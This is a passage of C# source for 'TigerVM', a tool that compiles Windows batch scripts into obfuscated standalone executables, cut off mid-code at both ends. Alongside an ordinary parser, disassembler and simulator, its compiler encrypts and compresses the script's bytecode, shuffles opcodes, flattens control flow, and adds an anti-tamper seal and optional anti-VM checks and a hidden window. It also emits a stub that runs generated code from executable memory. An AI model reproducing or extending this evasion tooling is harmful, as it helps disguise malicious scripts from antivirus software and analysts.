                {
                    Match m = Regex.Match(workLine, @"exit(?:\s+/b)?(?:\s+(\d+))?", RegexOptions.IgnoreCase);
                    int code = (m.Success && m.Groups[1].Success) ? int.Parse(m.Groups[1].Value) : 0;
                    instrs.Add(new VmInstruction { Op = VmOpcode.Exit, IntVal = code });
                    continue;
                }

                // Set /a
                if (workLine.StartsWith("set /a ", StringComparison.OrdinalIgnoreCase))
                {
                    string expr = workLine.Substring(7).Trim().Trim('"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1)
                    {
                        string vname = expr.Substring(0, eq).Trim();
                        string math = expr.Substring(eq + 1).Trim();
                        instrs.Add(new VmInstruction { Op = VmOpcode.SetMath, Arg1 = vname, Arg2 = math });
                        continue;
                    }
                }

                // Set /p
                if (workLine.StartsWith("set /p ", StringComparison.OrdinalIgnoreCase))
                {
                    string expr = workLine.Substring(7).Trim().Trim('"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1)
                    {
                        string vname = expr.Substring(0, eq).Trim();
                        string prompt = expr.Substring(eq + 1).Trim();
                        instrs.Add(new VmInstruction { Op = VmOpcode.SetPrompt, Arg1 = vname, Arg2 = prompt });
                        continue;
                    }
                }

                // Standard Set
                if (workLine.StartsWith("set ", StringComparison.OrdinalIgnoreCase))
                {
                    string expr = workLine.Substring(4).Trim().Trim('"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1)
                    {
                        string vname = expr.Substring(0, eq).Trim();
                        string val = expr.Substring(eq + 1);
                        instrs.Add(new VmInstruction { Op = VmOpcode.SetVar, Arg1 = vname, Arg2 = val });
                        continue;
                    }
                }

                // IF statements
                if (workLine.StartsWith("if ", StringComparison.OrdinalIgnoreCase))
                {
                    if (TryParseIfStatement(workLine, instrs)) continue;
                }

                // Complex batch pipe or external command execution
                if (workLine.Contains("|") || workLine.Contains(">") || workLine.Contains("<") || workLine.Contains("&"))
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.PipeStream, Arg1 = workLine });
                }
                else
                {
                    instrs.Add(new VmInstruction { Op = VmOpcode.ExecDirect, Arg1 = workLine });
                }
            }

            return instrs;
        }

        private static string CleanBodyString(string body)
        {
            if (string.IsNullOrEmpty(body)) return "";
            body = body.Trim();
            while (body.StartsWith("(") && body.EndsWith(")"))
            {
                body = body.Substring(1, body.Length - 2).Trim();
            }
            char[] trims = new[] { '&', ' ', '\r', '\n', '\t' };
            body = body.Trim(trims);
            return body;
        }

        private static bool TryParseForLoop(string line, List<VmInstruction> instrs)
        {
            // FOR /L %var IN (start,step,end) DO (body)
            Match matchL = Regex.Match(line, @"for\s+/l\s+%+([a-zA-Z0-9_]+)\s+in\s*\(([^)]+)\)\s+do\s+(.+)", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            if (matchL.Success)
            {
                string varName = matchL.Groups[1].Value;
                string rangeStr = matchL.Groups[2].Value;
                string body = CleanBodyString(matchL.Groups[3].Value);

                string[] rParts = rangeStr.Split(new[] { ',', ' ' }, StringSplitOptions.RemoveEmptyEntries);
                string start = rParts.Length > 0 ? rParts[0] : "1";
                string step = rParts.Length > 1 ? rParts[1] : "1";
                string end = rParts.Length > 2 ? rParts[2] : "1";

                instrs.Add(new VmInstruction
                {
                    Op = VmOpcode.ForNumeric,
                    Arg1 = varName,
                    Arg2 = start,
                    Arg3 = step,
                    Arg4 = end + "|" + body
                });
                return true;
            }

            // FOR /F ["options"] %var IN (source) DO (body)
            Match matchF = Regex.Match(line, @"for\s+/f\s*(?:""([^""]*)"")?\s+%+([a-zA-Z0-9_]+)\s+in\s*\(([^)]+)\)\s+do\s+(.+)", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            if (matchF.Success)
            {
                string options = matchF.Groups[1].Value;
                string varName = matchF.Groups[2].Value;
                string source = matchF.Groups[3].Value.Trim();
                string body = CleanBodyString(matchF.Groups[4].Value);

                instrs.Add(new VmInstruction
                {
                    Op = VmOpcode.ForTokens,
                    Arg1 = varName,
                    Arg2 = options,
                    Arg3 = source,
                    Arg4 = body
                });
                return true;
            }

            // FOR /R [path] %var IN (set) DO (body)
            Match matchR = Regex.Match(line, @"for\s+/r\s*(?:([^\s%]+))?\s+%+([a-zA-Z0-9_]+)\s+in\s*\(([^)]+)\)\s+do\s+(.+)", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            if (matchR.Success)
            {
                string rootPath = matchR.Groups[1].Value;
                string varName = matchR.Groups[2].Value;
                string pattern = matchR.Groups[3].Value.Trim();
                string body = CleanBodyString(matchR.Groups[4].Value);

                instrs.Add(new VmInstruction
                {
                    Op = VmOpcode.ForFiles,
                    Arg1 = varName,
                    Arg2 = string.IsNullOrEmpty(rootPath) ? "." : rootPath,
                    Arg3 = pattern,
                    Arg4 = body,
                    Flag1 = true // recursive
                });
                return true;
            }

            // Standard FOR %var IN (set) DO (body)
            Match matchStd = Regex.Match(line, @"for\s+%+([a-zA-Z0-9_]+)\s+in\s*\(([^)]+)\)\s+do\s+(.+)", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            if (matchStd.Success)
            {
                string varName = matchStd.Groups[1].Value;
                string pattern = matchStd.Groups[2].Value.Trim();
                string body = CleanBodyString(matchStd.Groups[3].Value);

                instrs.Add(new VmInstruction
                {
                    Op = VmOpcode.ForFiles,
                    Arg1 = varName,
                    Arg2 = ".",
                    Arg3 = pattern,
                    Arg4 = body,
                    Flag1 = false // not recursive
                });
                return true;
            }

            return false;
        }

        private static bool TryParseIfStatement(string line, List<VmInstruction> instrs)
        {
            string s = line.Substring(3).Trim();
            bool ignoreCase = false;
            if (s.StartsWith("/i ", StringComparison.OrdinalIgnoreCase))
            {
                ignoreCase = true;
                s = s.Substring(3).Trim();
            }

            bool negate = false;
            if (s.StartsWith("not ", StringComparison.OrdinalIgnoreCase))
            {
                negate = true;
                s = s.Substring(4).Trim();
            }

            // IF [NOT] EXIST <path> <action>
            if (s.StartsWith("exist ", StringComparison.OrdinalIgnoreCase))
            {
                string rest = s.Substring(6).Trim();
                int splitIdx = FindActionSplit(rest);
                if (splitIdx != -1)
                {
                    string pathExpr = rest.Substring(0, splitIdx).Trim().Trim('"', '\'');
                    string action = rest.Substring(splitIdx).Trim();
                    instrs.Add(new VmInstruction { Op = VmOpcode.IfExist, Arg1 = pathExpr, Arg2 = action, Flag1 = negate });
                    return true;
                }
            }

            // IF [NOT] DEFINED <var> <action>
            if (s.StartsWith("defined ", StringComparison.OrdinalIgnoreCase))
            {
                string rest = s.Substring(8).Trim();
                int splitIdx = FindActionSplit(rest);
                if (splitIdx != -1)
                {
                    string varName = rest.Substring(0, splitIdx).Trim().Trim('"', '%');
                    string action = rest.Substring(splitIdx).Trim();
                    instrs.Add(new VmInstruction { Op = VmOpcode.IfDefined, Arg1 = varName, Arg2 = action, Flag1 = negate });
                    return true;
                }
            }

            // IF [NOT] ERRORLEVEL <n> <action>
            if (s.StartsWith("errorlevel ", StringComparison.OrdinalIgnoreCase))
            {
                string rest = s.Substring(11).Trim();
                int splitIdx = FindActionSplit(rest);
                if (splitIdx != -1)
                {
                    string numStr = rest.Substring(0, splitIdx).Trim();
                    string action = rest.Substring(splitIdx).Trim();
                    int lvl = 0; int.TryParse(numStr, out lvl);
                    instrs.Add(new VmInstruction { Op = VmOpcode.IfErrorLevel, IntVal = lvl, Arg2 = action, Flag1 = negate });
                    return true;
                }
            }

            // IF [NOT] <left> == <right> <action>
            int eqPos = s.IndexOf("==");
            if (eqPos != -1)
            {
                string left = s.Substring(0, eqPos).Trim();
                string rightAndAction = s.Substring(eqPos + 2).Trim();
                int splitIdx = FindActionSplit(rightAndAction);
                if (splitIdx != -1)
                {
                    string right = rightAndAction.Substring(0, splitIdx).Trim();
                    string action = rightAndAction.Substring(splitIdx).Trim();
                    instrs.Add(new VmInstruction
                    {
                        Op = VmOpcode.IfCmp,
                        Arg1 = left,
                        Arg2 = right,
                        Arg3 = action,
                        Arg4 = "==",
                        Flag1 = negate,
                        Flag2 = ignoreCase
                    });
                    return true;
                }
            }

            // Comparison operators (EQU, NEQ, LSS, LEQ, GTR, GEQ)
            string[] opers = new[] { " EQU ", " NEQ ", " LSS ", " LEQ ", " GTR ", " GEQ " };
            foreach (string op in opers)
            {
                int opPos = s.IndexOf(op, StringComparison.OrdinalIgnoreCase);
                if (opPos != -1)
                {
                    string left = s.Substring(0, opPos).Trim();
                    string rightAndAction = s.Substring(opPos + op.Length).Trim();
                    int splitIdx = FindActionSplit(rightAndAction);
                    if (splitIdx != -1)
                    {
                        string right = rightAndAction.Substring(0, splitIdx).Trim();
                        string action = rightAndAction.Substring(splitIdx).Trim();
                        instrs.Add(new VmInstruction
                        {
                            Op = VmOpcode.IfCmp,
                            Arg1 = left,
                            Arg2 = right,
                            Arg3 = action,
                            Arg4 = op.Trim().ToUpperInvariant(),
                            Flag1 = negate,
                            Flag2 = ignoreCase
                        });
                        return true;
                    }
                }
            }

            return false;
        }

        private static int FindActionSplit(string text)
        {
            string[] keywords = new[] { "goto ", "call ", "echo ", "set ", "exit ", "cls", "pause", "(" };
            int earliest = -1;
            foreach (string kw in keywords)
            {
                int idx = text.IndexOf(kw, StringComparison.OrdinalIgnoreCase);
                if (idx != -1)
                {
                    if (earliest == -1 || idx < earliest) earliest = idx;
                }
            }
            return earliest;
        }

        public static byte[] SerializeTigerVmBytecode(List<VmInstruction> instrs, Dictionary<VmOpcode, byte> opcodeMap, byte[] encryptionKey)
        {
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms, Encoding.UTF8))
            {
                bw.Write((byte)0x54); // T
                bw.Write((byte)0x47); // G
                bw.Write((byte)0x5A); // Z
                bw.Write((byte)0x56); // V
                bw.Write((int)instrs.Count);

                foreach (var inst in instrs)
                {
                    byte mappedOp = opcodeMap.ContainsKey(inst.Op) ? opcodeMap[inst.Op] : (byte)inst.Op;
                    bw.Write(mappedOp);
                    bw.Write(inst.Arg1 ?? "");
                    bw.Write(inst.Arg2 ?? "");
                    bw.Write(inst.Arg3 ?? "");
                    bw.Write(inst.Arg4 ?? "");
                    bw.Write(inst.Flag1);
                    bw.Write(inst.Flag2);
                    bw.Write(inst.IntVal);
                    bw.Write(inst.StateId);
                    bw.Write(inst.NextStateId);
                }

                byte[] raw = ms.ToArray();
                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                {
                    encrypted[i] = (byte)(raw[i] ^ encryptionKey[i % encryptionKey.Length] ^ (i & 0xFF));
                }
                return encrypted;
            }
        }
        #endregion

        #region Disassembler & Simulator
        public static void DisassembleScript(string scriptContent)
        {
            var instrs = ParseBatchToTigerVm(scriptContent);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[+] ─── TigerVM Bytecode Disassembly (" + instrs.Count + " Instructions) ───");
            Console.ResetColor();

            for (int i = 0; i < instrs.Count; i++)
            {
                var inst = instrs[i];
                string opName = inst.Op.ToString().ToUpperInvariant().PadRight(14);
                string args = string.Format("A1='{0}' A2='{1}' A3='{2}' A4='{3}' F1={4} F2={5} Iv={6}",
                    inst.Arg1, inst.Arg2, inst.Arg3, inst.Arg4, inst.Flag1, inst.Flag2, inst.IntVal);

                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(string.Format("  [{0:D4}]  ", i));
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(opName);
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(" " + args);
            }
            Console.ResetColor();
        }

        public static void SimulateScript(string scriptContent, string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n[+] Initializing TigerVM Simulator Runtime...");
            Console.ResetColor();

            var instrs = ParseBatchToTigerVm(scriptContent);
            Dictionary<string, string> vars = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (System.Collections.DictionaryEntry env in Environment.GetEnvironmentVariables())
            {
                vars[env.Key.ToString()] = env.Value != null ? env.Value.ToString() : "";
            }
            vars["*"] = string.Join(" ", args);
            for (int i = 0; i < args.Length && i < 9; i++) vars[(i + 1).ToString()] = args[i];

            Dictionary<string, int> labels = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
            for (int i = 0; i < instrs.Count; i++)
            {
                if (instrs[i].Op == VmOpcode.Label && !string.IsNullOrEmpty(instrs[i].Arg1))
                {
                    labels[instrs[i].Arg1.ToLowerInvariant()] = i;
                }
            }

            int ip = 0;
            int exitCode = 0;
            Stack<int> callStack = new Stack<int>();

            while (ip < instrs.Count)
            {
                var inst = instrs[ip];
                switch (inst.Op)
                {
                    case VmOpcode.Echo:
                        Console.WriteLine(ExpandVarsSim(inst.Arg1, vars, exitCode));
                        break;
                    case VmOpcode.SetVar:
                        vars[inst.Arg1] = ExpandVarsSim(inst.Arg2, vars, exitCode);
                        break;
                    case VmOpcode.SetMath:
                        vars[inst.Arg1] = EvalMathSim(inst.Arg2, vars).ToString();
                        break;
                    case VmOpcode.Goto:
                        string tgt = ExpandVarsSim(inst.Arg1, vars, exitCode).ToLowerInvariant();
                        if (labels.ContainsKey(tgt)) { ip = labels[tgt]; continue; }
                        break;
                    case VmOpcode.CallSub:
                        string subTgt = ExpandVarsSim(inst.Arg1, vars, exitCode).ToLowerInvariant();
                        string subParam = ExpandVarsSim(inst.Arg2, vars, exitCode).Trim('"');
                        if (labels.ContainsKey(subTgt))
                        {
                            callStack.Push(ip + 1);
                            vars["1"] = subParam;
                            ip = labels[subTgt];
                            continue;
                        }
                        break;
                    case VmOpcode.Return:
                        if (callStack.Count > 0) { ip = callStack.Pop(); continue; }
                        break;
                    case VmOpcode.ForNumeric:
                        string vName = inst.Arg1;
                        long sVal = EvalMathSim(inst.Arg2, vars);
                        long stepVal = EvalMathSim(inst.Arg3, vars);
                        string[] a4Parts = (inst.Arg4 ?? "").Split(new[] { '|' }, 2);
                        long eVal = a4Parts.Length > 0 ? EvalMathSim(a4Parts[0], vars) : 0;
                        string loopBody = a4Parts.Length > 1 ? a4Parts[1] : "";

                        for (long cur = sVal; stepVal >= 0 ? cur <= eVal : cur >= eVal; cur += stepVal)
                        {
                            vars[vName] = cur.ToString();
                            string expBody = loopBody.Replace("%%" + vName, cur.ToString()).Replace("%" + vName + "%", cur.ToString());
                            ExecuteSubCommandSim(expBody, vars, ref exitCode);
                        }
                        break;
                    case VmOpcode.ForTokens:
                        string tVar = inst.Arg1;
                        string tOpts = inst.Arg2;
                        string tSource = ExpandVarsSim(inst.Arg3, vars, exitCode).Trim('"');
                        string fBody = inst.Arg4;
                        string delims = ", \t";
                        if (tOpts.Contains("delims="))
                        {
                            int dIdx = tOpts.IndexOf("delims=");
                            delims = tOpts.Substring(dIdx + 7).Split(' ')[0];
                        }
                        string[] tokens = tSource.Split(delims.ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                        string expFBody = fBody;
                        for (int t = 0; t < tokens.Length; t++)
                        {
                            char vChar = tVar.Length > 0 ? tVar[0] : 'a';
                            char currentVarName = (char)(vChar + t);
                            vars[currentVarName.ToString()] = tokens[t];
                            expFBody = expFBody.Replace("%%" + currentVarName, tokens[t]).Replace("%" + currentVarName + "%", tokens[t]);
                        }
                        ExecuteSubCommandSim(expFBody, vars, ref exitCode);
                        break;
                    case VmOpcode.IfCmp:
                        string left = ExpandVarsSim(inst.Arg1, vars, exitCode);
                        string right = ExpandVarsSim(inst.Arg2, vars, exitCode);
                        bool match = (inst.Arg4 == "==") ? left.Equals(right, StringComparison.OrdinalIgnoreCase) : false;
                        if (inst.Flag1) match = !match;
                        if (match) ExecuteSubCommandSim(inst.Arg3, vars, ref exitCode);
                        break;
                    case VmOpcode.Exit:
                        exitCode = inst.IntVal;
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine("\n[*] Simulator Execution Completed. ExitCode: " + exitCode);
                        Console.ResetColor();
                        return;
                }
                ip++;
            }
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[*] Simulator Execution Completed. ExitCode: " + exitCode);
            Console.ResetColor();
        }

        private static string ExpandVarsSim(string input, Dictionary<string, string> vars, int exitCode)
        {
            if (string.IsNullOrEmpty(input)) return "";
            input = input.Replace("%ERRORLEVEL%", exitCode.ToString());
            return Regex.Replace(input, @"[%!]([^%!]+)[%!]", m =>
            {
                string key = m.Groups[1].Value;
                if (vars.ContainsKey(key)) return vars[key];
                if (key.Contains(":~"))
                {
                    int colon = key.IndexOf(":~");
                    string v = key.Substring(0, colon);
                    string slice = key.Substring(colon + 2);
                    string val = vars.ContainsKey(v) ? vars[v] : "";
                    string[] parts = slice.Split(',');
                    int start = 0; int.TryParse(parts[0], out start);
                    if (start < 0) start = Math.Max(0, val.Length + start);
                    if (start >= val.Length) return "";
                    if (parts.Length > 1)
                    {
                        int len = 0; int.TryParse(parts[1], out len);
                        if (len < 0) len = Math.Max(0, val.Length - start + len);
                        len = Math.Min(len, val.Length - start);
                        return val.Substring(start, Math.Max(0, len));
                    }
                    return val.Substring(start);
                }
                if (key.Contains(":") && key.Contains("="))
                {
                    int colon = key.IndexOf(':');
                    string v = key.Substring(0, colon);
                    string sub = key.Substring(colon + 1);
                    int eq = sub.IndexOf('=');
                    string find = sub.Substring(0, eq);
                    string repl = sub.Substring(eq + 1);
                    string val = vars.ContainsKey(v) ? vars[v] : "";
                    return val.Replace(find, repl);
                }
                return "";
            });
        }

        private static long EvalMathSim(string expr, Dictionary<string, string> vars)
        {
            if (string.IsNullOrEmpty(expr)) return 0;
            expr = ExpandVarsSim(expr, vars, 0).Trim();
            foreach (var kv in vars)
            {
                if (!string.IsNullOrEmpty(kv.Key) && (char.IsLetter(kv.Key[0]) || kv.Key[0] == '_'))
                {
                    expr = Regex.Replace(expr, @"\b" + Regex.Escape(kv.Key) + @"\b", string.IsNullOrEmpty(kv.Value) ? "0" : kv.Value);
                }
            }
            try
            {
                var dt = new System.Data.DataTable();
                var res = dt.Compute(expr, "");
                return Convert.ToInt64(res);
            }
            catch { return 0; }
        }

        private static void ExecuteSubCommandSim(string cmd, Dictionary<string, string> vars, ref int exitCode)
        {
            cmd = cmd.Trim();
            if (string.IsNullOrEmpty(cmd)) return;
            string[] subCmds = cmd.Split(new[] { " & " }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string c in subCmds)
            {
                string sc = c.Trim();
                if (sc.StartsWith("echo ", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine(ExpandVarsSim(sc.Substring(5), vars, exitCode));
                }
                else if (sc.StartsWith("set /a ", StringComparison.OrdinalIgnoreCase))
                {
                    string expr = sc.Substring(7).Trim().Trim('"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1) vars[expr.Substring(0, eq).Trim()] = EvalMathSim(expr.Substring(eq + 1), vars).ToString();
                }
                else if (sc.StartsWith("set ", StringComparison.OrdinalIgnoreCase))
                {
                    string expr = sc.Substring(4).Trim().Trim('"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1) vars[expr.Substring(0, eq).Trim()] = ExpandVarsSim(expr.Substring(eq + 1), vars, exitCode);
                }
            }
        }
        #endregion

        #region Compiler Engine & Standalone TigerVM Stub Generator
        public static bool CompileToTigerVmExe(
            string scriptContent,
            string outExePath,
            bool hidden,
            bool requireAdmin,
            string iconPath,
            string[] embedFiles,
            string tag,
            bool enableArmor,
            bool enableCff,
            bool enableAntiVm)
        {
            string cscPath = FindCsc();
            if (string.IsNullOrEmpty(cscPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Error: Microsoft .NET Framework csc.exe compiler not found.");
                return false;
            }

            var instructions = ParseBatchToTigerVm(scriptContent);
            instructions = OptimizeAst(instructions);

            // Control Flow Flattening State assignment
            int stateSeed = Rnd.Next(0x10000, 0x7FFFF);
            List<int> stateIds = new List<int>();
            for (int i = 0; i < instructions.Count; i++)
            {
                stateIds.Add(stateSeed + (i * 31) + Rnd.Next(1, 100));
            }
            for (int i = 0; i < instructions.Count; i++)
            {
                instructions[i].StateId = stateIds[i];
                instructions[i].NextStateId = (i + 1 < instructions.Count) ? stateIds[i + 1] : 0xDEAD;
            }

            Dictionary<VmOpcode, byte> opcodeMap = new Dictionary<VmOpcode, byte>();
            List<byte> bytePool = new List<byte>();
            for (int b = 0; b <= 255; b++) bytePool.Add((byte)b);
            Shuffle(bytePool);

            int poolIdx = 0;
            foreach (VmOpcode op in Enum.GetValues(typeof(VmOpcode)))
            {
                opcodeMap[op] = bytePool[poolIdx++];
            }

            byte[] key = new byte[32];
            Rnd.NextBytes(key);

            byte[] encryptedBytecode = SerializeTigerVmBytecode(instructions, opcodeMap, key);
            byte[] compressedBytecode;
            using (MemoryStream ms = new MemoryStream())
            {
                using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Compress))
                {
                    ds.Write(encryptedBytecode, 0, encryptedBytecode.Length);
                }
                compressedBytecode = ms.ToArray();
            }

            string b64Bytecode = Convert.ToBase64String(compressedBytecode);
            string b64Key = Convert.ToBase64String(key);

            // SHA-256 Anti-Tamper Seal (Computed on compressed payload)
            string bytecodeSha256;
            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(compressedBytecode);
                bytecodeSha256 = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
            }

            StringBuilder opcodeMapInit = new StringBuilder();
            foreach (var kv in opcodeMap)
            {
                opcodeMapInit.AppendLine("            _opMap[" + kv.Value + "] = " + (int)kv.Key + ";");
            }

            StringBuilder embedCode = new StringBuilder();
            if (embedFiles != null)
            {
                foreach (string f in embedFiles)
                {
                    if (File.Exists(f))
                    {
                        string fname = Path.GetFileName(f);
                        string b64File = Convert.ToBase64String(File.ReadAllBytes(f));
                        embedCode.AppendLine("            EmbeddedFiles[\"" + fname + "\"] = \"" + b64File + "\";");
                    }
                }
            }

            string showWindow = hidden ? "ProcessWindowStyle.Hidden" : "ProcessWindowStyle.Normal";
            string noWindow = hidden ? "true" : "false";

            string armorCode = GenerateArmorSource(enableAntiVm);
            string armorCall = enableArmor ? "            TigerArmor.VerifyEnvironment();" : "";

            StringBuilder csBld = new StringBuilder();
            csBld.AppendLine("// [ TigerVM Native Binary Host v5.0 // Hardened Enterprise Runtime ]");
            csBld.AppendLine("using System;");
            csBld.AppendLine("using System.IO;");
            csBld.AppendLine("using System.IO.Compression;");
            csBld.AppendLine("using System.Text;");
            csBld.AppendLine("using System.Diagnostics;");
            csBld.AppendLine("using System.Collections.Generic;");
            csBld.AppendLine("using System.Reflection;");
            csBld.AppendLine("using System.Runtime.InteropServices;");
            csBld.AppendLine("using System.Text.RegularExpressions;");
            csBld.AppendLine("using System.Security.Cryptography;");
            csBld.AppendLine("[assembly: AssemblyTitle(\"TigerVM Standalone Binary\")]");
            csBld.AppendLine("[assembly: AssemblyProduct(\"TigerVM Virtualized Application\")]");
            csBld.AppendLine("[assembly: AssemblyVersion(\"9.0.0.0\")]");
            csBld.AppendLine("[assembly: AssemblyFileVersion(\"9.0.0.0\")]");
            csBld.AppendLine("namespace TigerVmApp {");

            csBld.AppendLine(armorCode);

            csBld.AppendLine("    public static class NativeJit {");
            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
            csBld.AppendLine("        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);");
            csBld.AppendLine("        [DllImport(\"kernel32.dll\", SetLastError = true)]");
            csBld.AppendLine("        [return: MarshalAs(UnmanagedType.Bool)]");
            csBld.AppendLine("        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]");
            csBld.AppendLine("        private delegate long JittedFunc64();");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]");
            csBld.AppendLine("        private delegate int JittedFunc32();");
            csBld.AppendLine("        public static long Eval(string expr, Dictionary<string, string> vars) {");
            csBld.AppendLine("            if (string.IsNullOrEmpty(expr)) return 0;");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                bool is64 = IntPtr.Size == 8;");
            csBld.AppendLine("                List<byte> code = new List<byte>();");
            csBld.AppendLine("                string clean = expr.Trim();");
            csBld.AppendLine("                if (vars != null) {");
            csBld.AppendLine("                    foreach (var kv in vars) {");
            csBld.AppendLine("                        if (!string.IsNullOrEmpty(kv.Key) && (char.IsLetter(kv.Key[0]) || kv.Key[0] == '_')) {");
            csBld.AppendLine("                            clean = Regex.Replace(clean, @\"\\b\" + Regex.Escape(kv.Key) + @\"\\b\", string.IsNullOrEmpty(kv.Value) ? \"0\" : kv.Value);");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("                var tokens = Regex.Matches(clean, @\"([0-9]+)|([+\\-*\\/^%&|])\");");
            csBld.AppendLine("                if (tokens.Count == 0) return 0;");
            csBld.AppendLine("                long initialVal = 0;");
            csBld.AppendLine("                long.TryParse(tokens[0].Value, out initialVal);");
            csBld.AppendLine("                if (is64) {");
            csBld.AppendLine("                    code.Add(0x48); code.Add(0xB8);");
            csBld.AppendLine("                    code.AddRange(BitConverter.GetBytes(initialVal));");
            csBld.AppendLine("                    int i = 1;");
            csBld.AppendLine("                    while (i < tokens.Count - 1) {");
            csBld.AppendLine("                        string op = tokens[i].Value;");
            csBld.AppendLine("                        long operand = 0;");
            csBld.AppendLine("                        long.TryParse(tokens[i + 1].Value, out operand);");
            csBld.AppendLine("                        code.Add(0x48); code.Add(0xB9);");
            csBld.AppendLine("                        code.AddRange(BitConverter.GetBytes(operand));");
            csBld.AppendLine("                        if (op == \"+\") code.AddRange(new byte[] { 0x48, 0x01, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"-\") code.AddRange(new byte[] { 0x48, 0x29, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"*\") code.AddRange(new byte[] { 0x48, 0x0F, 0xAF, 0xC1 });");
            csBld.AppendLine("                        else if (op == \"/\") code.AddRange(new byte[] { 0x48, 0x85, 0xC9, 0x74, 0x05, 0x48, 0x99, 0x48, 0xF7, 0xF9 });");
            csBld.AppendLine("                        else if (op == \"%\") code.AddRange(new byte[] { 0x48, 0x85, 0xC9, 0x74, 0x08, 0x48, 0x99, 0x48, 0xF7, 0xF9, 0x48, 0x89, 0xD0 });");
            csBld.AppendLine("                        else if (op == \"^\") code.AddRange(new byte[] { 0x48, 0x31, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"&\") code.AddRange(new byte[] { 0x48, 0x21, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"|\") code.AddRange(new byte[] { 0x48, 0x09, 0xC8 });");
            csBld.AppendLine("                        i += 2;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    code.Add(0xC3);");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    code.Add(0xB8);");
            csBld.AppendLine("                    code.AddRange(BitConverter.GetBytes((int)initialVal));");
            csBld.AppendLine("                    int i = 1;");
            csBld.AppendLine("                    while (i < tokens.Count - 1) {");
            csBld.AppendLine("                        string op = tokens[i].Value;");
            csBld.AppendLine("                        int operand = 0;");
            csBld.AppendLine("                        int.TryParse(tokens[i + 1].Value, out operand);");
            csBld.AppendLine("                        code.Add(0xB9);");
            csBld.AppendLine("                        code.AddRange(BitConverter.GetBytes(operand));");
            csBld.AppendLine("                        if (op == \"+\") code.AddRange(new byte[] { 0x01, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"-\") code.AddRange(new byte[] { 0x29, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"*\") code.AddRange(new byte[] { 0x0F, 0xAF, 0xC1 });");
            csBld.AppendLine("                        else if (op == \"/\") code.AddRange(new byte[] { 0x85, 0xC9, 0x74, 0x03, 0x99, 0xF7, 0xF9 });");
            csBld.AppendLine("                        else if (op == \"%\") code.AddRange(new byte[] { 0x85, 0xC9, 0x74, 0x05, 0x99, 0xF7, 0xF9, 0x89, 0xD0 });");
            csBld.AppendLine("                        else if (op == \"^\") code.AddRange(new byte[] { 0x31, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"&\") code.AddRange(new byte[] { 0x21, 0xC8 });");
            csBld.AppendLine("                        else if (op == \"|\") code.AddRange(new byte[] { 0x09, 0xC8 });");
            csBld.AppendLine("                        i += 2;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    code.Add(0xC3);");
            csBld.AppendLine("                }");
            csBld.AppendLine("                byte[] nativeBytes = code.ToArray();");
            csBld.AppendLine("                IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)nativeBytes.Length, 0x3000, 0x40);");
            csBld.AppendLine("                if (buf == IntPtr.Zero) return 0;");
            csBld.AppendLine("                Marshal.Copy(nativeBytes, 0, buf, nativeBytes.Length);");
            csBld.AppendLine("                long result = 0;");
            csBld.AppendLine("                if (is64) {");
            csBld.AppendLine("                    JittedFunc64 fn = (JittedFunc64)Marshal.GetDelegateForFunctionPointer(buf, typeof(JittedFunc64));");
            csBld.AppendLine("                    result = fn();");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    JittedFunc32 fn = (JittedFunc32)Marshal.GetDelegateForFunctionPointer(buf, typeof(JittedFunc32));");
            csBld.AppendLine("                    result = fn();");
            csBld.AppendLine("                }");
            csBld.AppendLine("                VirtualFree(buf, UIntPtr.Zero, 0x8000);");
            csBld.AppendLine("                return result;");
            csBld.AppendLine("            } catch {");
            csBld.AppendLine("                try {");
            csBld.AppendLine("                    var dt = new System.Data.DataTable();");
            csBld.AppendLine("                    var res = dt.Compute(expr, \"\");");
            csBld.AppendLine("                    return Convert.ToInt64(res);");
            csBld.AppendLine("                } catch { return 0; }");
